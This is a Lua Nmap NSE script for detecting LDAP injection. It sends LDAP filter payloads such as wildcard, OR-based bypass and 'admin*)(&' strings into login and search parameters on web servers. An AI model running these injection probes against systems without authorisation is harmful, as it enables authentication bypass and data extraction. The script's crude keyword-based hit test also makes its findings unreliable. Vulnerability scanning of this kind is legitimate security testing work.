-- LDAP Injection Detection
-- Tests for LDAP injection vulnerabilities

local http = require("http")
local stdnse = require("stdnse")

description = [[
Tests for LDAP injection vulnerabilities by injecting LDAP
filter syntax into web application parameters.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.protocol == "tcp" and
           (port.service == "http" or port.service == "https" or
            port.number == 80 or port.number == 443 or
            port.number == 8080)
end

action = function(host, port)
    local output = {}
    local findings = {}

    local payloads = {
        {"*", "Wildcard injection"},
        {"*)(&", "Filter manipulation"},
        {"*)|(&", "OR-based bypass"},
        {")(|(cn=*)", "Attribute enumeration"},
        {"admin*)(&", "Admin bypass"},
        {"*()|&'!", "Special character injection"},
    }

    local params = {"user", "username", "uid", "cn", "search", "filter", "q"}
    local test_paths = {"/login.php", "/search.php", "/admin/login.php", "/ldap.php"}

    local baseline_response = nil

    for _, test_path in ipairs(test_paths) do
        local base_check = http.get(host.ip, port, test_path)
        if base_check and base_check.status and base_check.status ~= 404 then
            for _, param in ipairs(params) do
                for _, payload in ipairs(payloads) do
                    local url = test_path .. "?" .. param .. "=" .. payload[1]
                    local r = http.get(host.ip, port, url)
                    if r and r.body then
                        if r.status == 200 and r.body:find("admin") and
                           not r.body:find("login") and not r.body:find("password") then
                            table.insert(findings, {
                                url = url,
                                param = param,
                                payload = payload[1],
                                type = payload[2]
                            })
                            break
                        end
                    end
                end
                if #findings > 0 then break end
            end
        end
        if #findings > 0 then break end
    end

    if #findings > 0 then
        table.insert(output, "LDAP Injection Vulnerabilities Found:")
        table.insert(output, "")
        for _, f in ipairs(findings) do
            table.insert(output, "[!] URL: " .. f.url)
            table.insert(output, "[!]   Parameter: " .. f.param)
            table.insert(output, "[!]   Type: " .. f.type)
            table.insert(output, "[!]   Payload: " .. f.payload)
            table.insert(output, "")
        end
        table.insert(output, "[!] HIGH: Allows authentication bypass and data extraction")
        return stdnse.format_output(true, output)
    end

    return nil
end
